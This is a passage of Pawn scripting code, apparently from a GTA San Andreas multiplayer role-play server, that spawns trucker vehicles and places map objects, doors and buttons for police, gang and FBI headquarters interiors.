	//TruckerVehicles[17] = AddStaticVehicleEx(456,2239.46142578,-2633.49414062,13.79451466,90.00000000,-1,-1,300); //Yankee
	//TruckerVehicles[18] = AddStaticVehicleEx(456,2239.34033203,-2627.85107422,13.79451466,90.00000000,-1,-1,300); //Yankee
	//TruckerVehicles[19] = AddStaticVehicleEx(456,2206.29296875,-2530.18920898,13.79687500,270.00000000,-1,-1,300); //Yankee
	//TruckerVehicles[20] = AddStaticVehicleEx(456,2206.20117188,-2524.10937500,13.79687500,270.00000000,-1,-1,300); //Yankee
	//TruckerVehicles[21] = AddStaticVehicleEx(456,2206.03466797,-2518.52441406,13.79687500,270.00000000,-1,-1,300); //Yankee

    // Paintball (pickup + 3dtextlabel)
    CreateDynamic3DTextLabel("Paintball - Type /paintball to play",COLOR_WHITE, 1295.90, -1424.05, 14.95+0.5,10.0);
    CreatePickup(1254, 23, 1295.90, -1424.05, 14.95, -1);

	// Added by Calgon (extra vehicles really needed)
    TruckerVehicles[22] = AddStaticVehicle(456,-1578.82,127.74,3.55,200.4689,102,300); // Ocean Docks 1
    TruckerVehicles[23] = AddStaticVehicle(456,-1581.66,121.87,3.55,200.3057,102,300); // Ocean Docks 2
    TruckerVehicles[24] = AddStaticVehicle(456,-1585.80,116.94,3.55,200.3797,102,300); // Ocean Docks 3
    TruckerVehicles[25] = AddStaticVehicle(456,-1588.52,114.57,3.55,200.0897,102,300); // Ocean Docks 4
    TruckerVehicles[26] = AddStaticVehicle(456,-1592.96,111.66,3.55,200.5815,102,300); // Ocean Docks 5
    TruckerVehicles[27] = AddStaticVehicle(456,-1596.75,102.65,3.55,200.5510,102,300); // Ocean Docks 6
    TruckerVehicles[28] = AddStaticVehicle(456,-1599.80,101.57,3.55,200.5483,102,300); // Ocean Docks 7
    TruckerVehicles[29] = AddStaticVehicle(456,-1602.77,99.15,3.55,200.2853,53,300); // Ocean Docks Truck
    TruckerVehicles[30] = AddStaticVehicle(456,-1605.88,96.85,3.55,200.8250,53,300); // Ocean Docks Truck
    TruckerVehicles[31] = AddStaticVehicle(456,-1609.35,93.86,3.55,200.8441,53,300); // Ocean Docks Truck
    TruckerVehicles[32] = AddStaticVehicle(456,-1611.35,93.87,3.55,200.6938,53,300); // Ocean Docks Truck
    TruckerVehicles[33] = AddStaticVehicle(456,-1613.35,93.89,3.55,200.6888,53,300); // Ocean Docks Truck
    TruckerVehicles[34] = AddStaticVehicle(456,-1615.35,93.91,3.55,200.6818,53,300); // Ocean Docks Truck
    TruckerVehicles[35] = AddStaticVehicle(456,-1617.35,93.90,3.55,200.7150,53,300); // Ocean Docks Truck
    TruckerVehicles[36] = AddStaticVehicle(456,-1618.35,93.88,3.55,200.9050,53,300); // Ocean Docks Truck

	//LSPD - LSFMD - All Saints
    CreateDynamicObject(18030, 2092.279296875, 2817.1181640625, -14.807208061218, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(2951, 2109.0756835938, 2812.5268554688, -17.188125610352, 0.000000, 0.000000, 270.67498779297); //
    CreateDynamicObject(2951, 2087.53515625, 2803.2150878906, -17.674396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(3386, 2103.3381347656, 2830.3115234375, -17.174396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(3387, 2103.4313964844, 2826.3564453125, -17.174396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(3389, 2101.015625, 2830.6564941406, -17.174396514893, 0.000000, 0.000000, 91.894958496094); //
    CreateDynamicObject(1997, 2071.7292480469, 2806.0947265625, -17.174396514893, 0.000000, 0.000000, 93.295013427734); //
    CreateDynamicObject(1997, 2071.7165527344, 2807.8830566406, -17.174396514893, 0.000000, 0.000000, 91.310028076172); //
    CreateDynamicObject(1997, 2071.7561035156, 2809.45703125, -17.174396514893, 0.000000, 0.000000, 91.310028076172); //
    CreateDynamicObject(3384, 2103.1545410156, 2822.3237304688, -15.731789588928, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(3383, 2100.4477539063, 2827.2509765625, -17.174396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(3383, 2100.5051269531, 2822.8688964844, -17.174396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(3383, 2094.5844726563, 2825.0227050781, -17.174396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(1796, 2100.0754394531, 2808.0727539063, -17.174396514893, 0.000000, 0.000000, 179.28002929688); //
    CreateDynamicObject(1796, 2098.4482421875, 2808.1791992188, -17.174396514893, 0.000000, 0.000000, 178.9150390625); //
    CreateDynamicObject(1796, 2102.0798339844, 2807.9851074219, -17.174396514893, 0.000000, 0.000000, 179.05505371094); //
    CreateDynamicObject(2239, 2103.4404296875, 2804.8537597656, -17.174396514893, 0.000000, 0.000000, 218.75506591797); //
    CreateDynamicObject(2184, 2085.3012695313, 2828.1159667969, -17.174396514893, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(1671, 2086.1975097656, 2829.4157714844, -16.714181900024, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(2190, 2087.134765625, 2828.1010742188, -16.398658752441, 0.000000, 0.000000, 230.5249786377); //
    CreateDynamicObject(2854, 2085.673828125, 2828.6516113281, -16.398658752441, 0.000000, 0.000000, 133.07997131348); //
    CreateDynamicObject(2946, 2081.85546875, 2831.0966796875, -17.174396514893, 0.000000, 0.000000, 91.310028076172); //
    CreateDynamicObject(10182, 1145.3453369141, -1326.4350585938, 14.297383308411, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(16656, 1421.5529785156, -2445.5986328125, -9.6055564880371, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(1997, 1430.8905029297, -2437.8049316406, -12.598474502563, 0.000000, 0.000000, 269.9599609375); //
    CreateDynamicObject(3384, 1431.6123046875, -2441.9572753906, -11.155867576599, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(1886, 1426.7391357422, -2451.6730957031, -7.6691589355469, 0.000000, 358.01501464844, 182.52499389648); //
    CreateDynamicObject(2951, 1420.4285888672, -2442.7119140625, -13.105556488037, 0.000000, 0.000000, 270.44995117188); //
    CreateDynamicObject(2951, 1420.4750976563, -2450.1713867188, -13.098474502563, 0.000000, 0.000000, 270.53997802734); //
    CreateDynamicObject(2946, 1425.0671386719, -2436.9409179688, -12.605556488037, 0.000000, 0.000000, 268.69006347656); //
    CreateDynamicObject(2606, 1422.2109375, -2436.7719726563, -10.66157245636, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(1999, 1421.7412109375, -2437.5876464844, -12.605556488037, 0.000000, 0.000000, 0.000000); //
    CreateDynamicObject(2356, 1422.6676025391, -2438.5456542969, -12.605556488037, 0.000000, 0.000000, 0.000000); //
	CreateDynamicObject(11008, 1530.6383056641, -2167.5698242188, 19.045516967773, 0.000000, 0.000000, 0.000000); //
	CreateDynamicObject(8356, 1560.9700927734, -2091.2924804688, 12.568482398987, 0.000000, 0.000000, 180); //
	CreateDynamicObject(8356, 1600.9536132813, -2091.2219238281, 12.568482398987, 0.000000, 0.000000, 180); //
	CreateDynamicObject(8356, 1501.1728515625, -2091.2724609375, 12.568482398987, 0.000000, 0.000000, 180); //
	CreateDynamicObject(5711, 1581.1998291016, -2159.6352539063, 16.031856536865, 0.000000, 0.000000, 180); //
	CreateDynamicObject(16564, 1618.6606445313, -2164.0412597656, 12.494687080383, 0.000000, 0.000000, 90); //
	CreateDynamicObject(8356, 1640.9392089844, -2091.2358398438, 12.568482398987, 0.000000, 0.000000, 179.99450683594); //
	CreateDynamicObject(12839, 1604.3753662109, -2180.419921875, 16.050001144409, 0.000000, 0.000000, 0.000000); //
 	/*CreateDynamicObject(994, 2222.9479980469, -1707.8178710938, 12.554218292236, 0.000000, 0.000000, 83.25);
	CreateDynamicObject(994, 2222.2282714844, -1714.1044921875, 12.554218292236, 0.000000, 0.000000, 83.248901367188);
	CreateDynamicObject(994, 2221.666015625, -1720.4332275391, 12.554218292236, 0.000000, 0.000000, 84.998901367188);
	CreateDynamicObject(997, 2221.5944824219, -1720.4653320313, 12.554218292236, 0.000000, 0.000000, 270.39489746094);
	CreateDynamicObject(997, 2221.6120605469, -1723.6779785156, 12.554218292236, 0.000000, 0.000000, 308.13818359375);
	CreateDynamicObject(997, 2223.5490722656, -1726.2283935547, 12.554218292236, 0.000000, 0.000000, 343.46838378906);
	CreateDynamicObject(994, 2232.9912109375, -1727.2038574219, 12.554218292236, 0.000000, 0.000000, 179.2939453125);
	CreateDynamicObject(994, 2239.298828125, -1727.1459960938, 12.554218292236, 0.000000, 0.000000, 180.29138183594);
	CreateDynamicObject(994, 2245.6069335938, -1727.1053466797, 12.554218292236, 0.000000, 0.000000, 180.29113769531);
	CreateDynamicObject(994, 2230.0375976563, -1702.1334228516, 12.554218292236, 0.000000, 0.000000, 174.55895996094);
	CreateDynamicObject(994, 2245.8688964844, -1720.8118896484, 12.554218292236, 0.000000, 0.000000, 267.63110351563);*/
	CreateDynamicObject(1495, 1582.6011962891, -1637.8992919922, 12.552812576294, 0.000000, 0.000000, 0.000000); //
	CreateDynamicObject(11326,1604.98535156,-1623.68457031,14.71534920,0.00000000,0.00000000,90.00000000); //object(sfse_hublockup) (1)
	CreateDynamicObject(1886,1581.56628418,-1633.38085938,16.76438522,0.00000000,0.00000000,308.90148926); //object(shop_sec_cam) (1)
	CreateDynamicObject(983, 1544.6878662109, -1620.4252929688, 13.038116455078, 0.000000, 0.000000, 0.000000); //
	CreateDynamicObject(983, 1544.7156982422, -1635.9808349609, 13.237470626831, 0.000000, 0.000000, 0.000000); //
	CreateDynamicObject(1344, 1544.7709960938, -1617.0625, 13.191030502319, 0.000000, 0.000000, 180); //
	CreateDynamicObject(13644, 1582.6353759766, -1639.0125732422, 10.541254043579, 0.000000, 19.14501953125, 268.55499267578); //
	//CreateDynamicObject(969, 1635.2663574219, -1852.6921386719, 12.548987388611, 0.000000, 0.000000, 179.99450683594); //
	CreateDynamicObject(1496, 1564.2520751953, -1667.3739013672, 27.395606994629, 0.000000, 0.000000, 0.000000); //
	CreateDynamicObject(12814, 264.49127197266, 1882.6428222656, 16.587562561035, 0, 0, 0);
	CreateDynamicObject(991, 226.45503234863, 1872.4094238281, 13.949615478516, 0, 0, 270.27062988281);
	CreateDynamicObject(3029, 2175.6774902344, 1594.2722167969, 998.97888183594, 0, 0, 268.69067382813); // Drug Factory Doors
	CreateDynamicObject(10832, 296.68603515625, -1549.5653076172, 77.338836669922, 0.000000, 0.000000, 162.94946289063); //
	CreateDynamicObject(3029, 2223.58203125, 1598.2083740234, 998.9765625, 0, 0, 268.69067382813);
	CreateDynamicObject(3471,1564.04772949,-1881.44250488,13.82141495,0.00000000,0.00000000,90.00000000); // TRIADS object(vgschinalion1) (2)
	CreateDynamicObject(3471,1571.83093262,-1881.41430664,13.82141495,0.00000000,0.00000000,90.00000000); // TRIADS object(vgschinalion1) (3)
	CreateDynamicObject(9482,1567.88854980,-1882.18041992,19.17709923,0.00000000,0.00000000,90.00000000); // TRIADS object(chinagate) (2)

	CreateDynamicObject(2948,968.48669434,-53.18999100,1000.12457275,0.00000000,0.00000000,0.00000000, .interiorid = 3); //object(cr_door_02) (1)
	CreateDynamicObject(2948,968.48632812,-53.18945312,1000.12457275,0.00000000,0.00000000,180.00000000, .interiorid = 3); //object(cr_door_02) (5)
	CreateDynamicObject(2885,968.70294189,-56.50698090,1005.57806396,0.00000000,0.00000000,90.00000000, .interiorid = 3); //object(xref_garagedoor) (1)
	CreateDynamicObject(2714,968.44470215,-53.15001678,1003.11096191,0.00000000,0.00000000,270.00000000, .interiorid = 3); //object(cj_open_sign_2) (1)
	CreateDynamicObject(2885,963.42553711,-56.52644730,1003.82830811,270.00000000,180.69543457,270.69543457, .interiorid = 3); //object(xref_garagedoor) (3)
	CreateDynamicObject(10671,680.26983643,-444.72039795,-24.75238800,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(savehousegdoor_sfs) (1)
	CreateDynamicObject(10671,682.69573975,-444.75363159,-24.75238800,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(savehousegdoor_sfs) (2)
	CreateDynamicObject(10671,680.79193115,-447.47885132,-26.72739220,0.00000000,90.00000000,0.00000000, .interiorid = 1); //object(savehousegdoor_sfs) (3)
	CreateDynamicObject(11319,680.67449951,-443.91644287,-26.69394875,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(sprayshpdr2_sfse) (1)

	//---------------FBI HQ Interior--------------------//
 	CreateDynamicObject(1536,293.27246094,-1481.46582031,-34.53342056,0.00000000,0.00000000,179.99450684,1324123, .interiorid = 1); //object(gen_doorext15) (2)
	CreateDynamicObject(1536,290.27832031,-1481.50488281,-34.53342056,0.00000000,0.00000000,0.00000000,1324123, .interiorid = 1); //object(gen_doorext15) (2)
	CreateDynamicObject(1776,291.19232178,-1512.44006348,-45.03078842,0.00000000,0.00000000,90.00000000,1324123, .interiorid = 1); //object(cj_candyvendor) (2)
	FBILobbyLeftBTN[0] = CreateButton(297.66613770,-1498.67749023,-44.59006119,0.79565430); //Lobby Button Left
	FBILobbyLeftBTN[1] = CreateButton(297.24850464,-1498.23107910,-44.59006119,180); //Lobby Button Left
	FBILobbyRightBTN[0] = CreateButton(300.05300903,-1521.40747070,-44.59006119,180); //Lobby Button Right
	FBILobbyRightBTN[1] = CreateButton(300.16033936,-1521.84387207,-44.59006119,0); //Lobby Button Right
	FBIPrivateBTN[0] = CreateButton(298.87384033,-1495.87316895,-27.32773209,270); //Private Office Button
	FBIPrivateBTN[1] = CreateButton(300.49453735,-1495.33837891,-27.28091812,180.49487305); //Private Office Button

	CreateDynamicObject(2886,297.66613770,-1498.67749023,-44.59006119,0,0,0.79565430, 1324123); //Lobby Button Left
	CreateDynamicObject(2886,297.24850464,-1498.23107910,-44.59006119,0,0,180, 1324123); //Lobby Button Left
	CreateDynamicObject(2886,300.05300903,-1521.40747070,-44.59006119,0,0,180, 1324123); //Lobby Button Right
	CreateDynamicObject(2886,300.16033936,-1521.84387207,-44.59006119,0,0,0, 1324123); //Lobby Button Right
	CreateDynamicObject(2886,298.87384033,-1495.87316895,-27.32773209,0,0,270, 1324123); //Private Office Button
	CreateDynamicObject(2886,300.49453735,-1495.33837891,-27.28091812,0,0,180.49487305, 1324123); //Private Office Button

	FBIPrivate[0] = CreateDynamicObject(1536,299.29986572,-1492.82666016,-28.73300552,0.00000000,0.00000000,270.00000000,1324123, .interiorid = 1); //Private Office Door Left
	FBIPrivate[1] = CreateDynamicObject(1536,299.33737183,-1495.83911133,-28.73300552,0.00000000,0.00000000,90.00000000,1324123, .interiorid = 1); //Private Office Door Right
	FBILobbyLeft = CreateDynamicObject(1536,295.40136719,-1498.43457031,-46.13965225,0.00000000,0.00000000,0.00000000,1324123, .interiorid = 1); //Lobby Door Left
	FBILobbyRight = CreateDynamicObject(1536,302.39355469,-1521.62988281,-46.13965225,0.00000000,0.00000000,179.99450684,1324123, .interiorid = 1); //Lobby Door Right

	CreateDynamicObject(1536,281.51000977,-1513.26867676,23.89100075,0.00000000,0.00000000,55.00000000); // Door in FBI garage

	CreateDynamicObject(14858,309.24609375,-1498.32812500,-29.38235855,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(veg_pol_main1) (1)
	CreateDynamicObject(14596,294.02929688,-1490.56835938,-35.43539047,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(paperchase_stairs) (1)
	CreateDynamicObject(14602,291.64355469,-1505.73730469,-40.76299286,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(paperchase01) (1)
	CreateDynamicObject(14593,308.32128906,-1535.68750000,-43.80562592,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(paperchase04) (1)
	CreateDynamicObject(8231,308.96191406,-1496.32617188,-38.62692261,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(vgsbikeschl05) (1)
	CreateDynamicObject(2395,300.22045898,-1490.45019531,-40.34618378,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,300.22143555,-1495.39575195,-40.34618378,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (2)
	CreateDynamicObject(2395,300.21777344,-1492.38110352,-38.05657196,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (3)
	CreateDynamicObject(1523,300.42980957,-1495.13427734,-40.51028061,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(gen_doorext10) (2)
	CreateDynamicObject(1491,317.16406250,-1489.74243164,-40.33905029,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(gen_doorint01) (3)
	CreateDynamicObject(18001,300.45489502,-1489.20227051,-38.69902802,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(int_barbera07) (2)
	CreateDynamicObject(8169,300.41653442,-1489.28137207,-37.95204163,73.49853516,270.00000000,179.99450684, .interiorid = 1); //object(vgs_guardhseflr) (2)
	CreateDynamicObject(2197,300.78768921,-1490.73352051,-40.85678101,90.00000000,0.00000000,0.00000000, .interiorid = 1); //object(filling_cabinet) (1)
	CreateDynamicObject(2197,300.78659058,-1489.06945801,-40.85678101,90.00000000,0.00000000,0.00000000, .interiorid = 1); //object(filling_cabinet) (2)
	CreateDynamicObject(2197,300.78652954,-1487.39941406,-40.85678101,90.00000000,0.00000000,0.00000000, .interiorid = 1); //object(filling_cabinet) (3)
	CreateDynamicObject(2515,300.82122803,-1491.78662109,-39.25311279,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_bs_sink) (1)
	CreateDynamicObject(2515,300.81488037,-1490.82836914,-39.25311279,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_bs_sink) (1)
	CreateDynamicObject(2515,300.80892944,-1489.84216309,-39.25311279,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_bs_sink) (1)
	CreateDynamicObject(2515,300.80908203,-1488.83654785,-39.25311279,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_bs_sink) (1)
	CreateDynamicObject(2738,313.09997559,-1491.99609375,-39.72719574,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_toilet_bs) (2)
	CreateDynamicObject(2957,314.01480103,-1489.76110840,-38.71026230,0.00000000,90.00000000,0.31311035, .interiorid = 1); //object(chinatgaragedoor) (2)
	CreateDynamicObject(2957,312.46731567,-1491.96643066,-38.71386337,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(chinatgaragedoor) (3)
	CreateDynamicObject(2957,312.46868896,-1491.96606445,-38.47619247,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(chinatgaragedoor) (4)
	CreateDynamicObject(2957,318.77011108,-1489.75573730,-38.71026230,0.00000000,90.00000000,0.00000000, .interiorid = 1); //object(chinatgaragedoor) (5)
	CreateDynamicObject(2957,317.91894531,-1489.73242188,-36.22134018,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(chinatgaragedoor) (6)
	CreateDynamicObject(2602,310.02233887,-1498.55773926,-39.60855103,0.00000000,0.00000000,225.12634277, .interiorid = 1); //object(police_cell_toilet) (1)
	CreateDynamicObject(2602,311.27764893,-1498.55688477,-39.60855103,0.00000000,0.00000000,225.12084961, .interiorid = 1); //object(police_cell_toilet) (2)
	CreateDynamicObject(2602,312.52236938,-1498.55688477,-39.60855103,0.00000000,0.00000000,225.12084961, .interiorid = 1); //object(police_cell_toilet) (3)
	CreateDynamicObject(2741,300.51300049,-1487.71777344,-38.53912735,0.00000000,0.00000000,90.19226074, .interiorid = 1); //object(cj_soap_disp) (1)
	CreateDynamicObject(2742,300.63558960,-1493.05334473,-38.75522995,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_handdrier) (1)
	CreateDynamicObject(2685,300.49490356,-1495.37646484,-38.65332794,0.00000000,0.00000000,90.04394531, .interiorid = 1); //object(cj_food_post1) (1)
	CreateDynamicObject(1522,276.98992920,-1506.53881836,-46.13738251,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(gen_doorshop3) (1)
	CreateDynamicObject(3798,301.63208008,-1521.53662109,-48.13918304,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(acbox3_sfs) (1)
	CreateDynamicObject(14420,301.31414795,-1504.62548828,-25.47793198,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(madddoggs09) (1)
	CreateDynamicObject(2395,296.75616455,-1490.17004395,-28.86031342,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,299.82714844,-1492.76855469,-28.86031342,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2952,299.73284912,-1476.11962891,-28.81253433,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(kmb_gimpdoor) (1)
	CreateDynamicObject(2952,299.73013306,-1473.99279785,-28.81253433,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(kmb_gimpdoor) (2)
	CreateDynamicObject(10558,307.77490234,-1490.10229492,-26.71455383,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(tbnsfs) (4)
	CreateDynamicObject(10558,303.61007690,-1474.12097168,-26.71455383,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(tbnsfs) (5)
	CreateDynamicObject(12814,313.29492188,-1478.75097656,-28.73871231,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(cuntyeland04) (1)
	CreateDynamicObject(12814,313.79980469,-1473.21289062,-34.54065323,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cuntyeland04) (2)
	CreateDynamicObject(5066,310.43295288,-1484.74877930,-33.05167389,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(mondoshave_las) (1)
	CreateDynamicObject(14598,303.44128418,-1505.88110352,-30.57250977,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(paperchase_glass) (1)
	CreateDynamicObject(2395,305.25082397,-1489.78857422,-28.86031342,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,301.95947266,-1490.32165527,-28.86031342,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,301.95996094,-1494.03027344,-28.86031342,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,303.02163696,-1495.31762695,-28.86031342,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(10558,299.79708862,-1485.71166992,-26.71455383,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(tbnsfs) (5)
	CreateDynamicObject(10558,299.79199219,-1477.44433594,-26.71455383,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(tbnsfs) (5)
	CreateDynamicObject(10558,308.07742310,-1477.47680664,-26.71455383,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(tbnsfs) (5)
	CreateDynamicObject(10558,308.07962036,-1485.49145508,-26.71455383,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(tbnsfs) (5)
	CreateDynamicObject(2395,303.70001221,-1495.32324219,-34.54189301,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,303.47012329,-1481.95263672,-34.54189301,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,303.47064209,-1485.67785645,-34.54189301,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,303.47103882,-1489.40173340,-34.54189301,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,303.47222900,-1493.12512207,-34.54189301,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,300.50918579,-1485.34570312,-34.54189301,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,300.50698853,-1489.05407715,-34.54189301,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,300.50997925,-1492.77001953,-34.54189301,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,300.50823975,-1484.68981934,-34.54189301,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(14782,309.60202026,-1543.15441895,-45.20714951,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(int3int_boxing30) (1)
	CreateDynamicObject(14782,309.58764648,-1536.19519043,-45.20714951,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(int3int_boxing30) (2)
	CreateDynamicObject(1827,305.07128906,-1533.61816406,-46.13375092,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(man_sdr_tables) (1)
	CreateDynamicObject(1811,304.16955566,-1531.93151855,-45.50744629,0.00000000,0.00000000,117.60995483, .interiorid = 1); //object(med_din_chair_5) (1)
	CreateDynamicObject(1811,305.66729736,-1531.85888672,-45.50744629,0.00000000,0.00000000,69.65365601, .interiorid = 1); //object(med_din_chair_5) (2)
	CreateDynamicObject(16000,309.58935547,-1500.71423340,-26.22244644,270.00000000,0.00000000,90.00000000, .interiorid = 1); //object(drvin_screen) (1)
	CreateDynamicObject(16000,310.02539062,-1492.14257812,-31.78104019,270.00000000,0.00000000,90.00000000, .interiorid = 1); //object(drvin_screen) (2)
	CreateDynamicObject(2395,309.09744263,-1546.07031250,-46.13375092,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (19)
	CreateDynamicObject(2395,309.09747314,-1542.33789062,-46.13375092,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (20)
	CreateDynamicObject(2395,309.09802246,-1538.61096191,-46.13375092,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (21)
	CreateDynamicObject(2395,309.09780884,-1534.87768555,-46.13375092,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (22)
	CreateDynamicObject(2395,309.09716797,-1534.07751465,-46.13375092,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (23)
	CreateDynamicObject(2395,308.94421387,-1531.32495117,-46.13555145,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (24)
	CreateDynamicObject(2395,308.94485474,-1535.05346680,-46.13555145,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (25)
	CreateDynamicObject(2395,308.94528198,-1538.78503418,-46.13555145,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (26)
	CreateDynamicObject(2395,308.94180298,-1542.47778320,-46.13555145,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (27)
	CreateDynamicObject(2395,308.94659424,-1543.31518555,-46.13555145,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (28)
	CreateDynamicObject(1432,307.47851562,-1544.94921875,-46.13375092,0.00000000,0.00000000,350.07385254, .interiorid = 1); //object(dyn_table_2) (1)
	CreateDynamicObject(1703,297.30395508,-1520.81726074,-46.12367630,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(kb_couch02) (1)
	CreateDynamicObject(1703,298.31497192,-1517.79614258,-46.12367630,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(kb_couch02) (2)
	CreateDynamicObject(2725,298.29296875,-1520.72167969,-45.69048691,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(lm_striptable) (1)
	CreateDynamicObject(1806,309.10546875,-1505.52636719,-46.12367630,0.00000000,0.00000000,105.87994385, .interiorid = 1); //object(med_office_chair) (1)
	CreateDynamicObject(2190,307.29687500,-1506.07812500,-45.40361786,0.00000000,0.00000000,104.99633789, .interiorid = 1); //object(pc_1) (1)
	CreateDynamicObject(1892,278.57611084,-1506.30029297,-46.13018036,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(security_gatsh) (1)
	CreateDynamicObject(2773,304.49935913,-1504.94628906,-45.61295319,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (1)
	CreateDynamicObject(2773,304.50588989,-1506.51086426,-45.61295319,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (2)
	CreateDynamicObject(2773,302.58798218,-1506.51135254,-45.61295319,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (3)
	CreateDynamicObject(2773,303.51632690,-1503.98291016,-45.61295319,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_airprt_bar) (4)
	CreateDynamicObject(2773,302.57733154,-1503.02441406,-45.61295319,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (5)
	CreateDynamicObject(2773,301.60446167,-1505.54931641,-45.61295319,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_airprt_bar) (6)
	CreateDynamicObject(2773,300.64788818,-1503.04052734,-45.61295319,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (7)
	CreateDynamicObject(2773,299.66088867,-1503.99853516,-45.61295319,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_airprt_bar) (8)
	CreateDynamicObject(2773,298.72500610,-1504.95776367,-45.61115265,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (9)
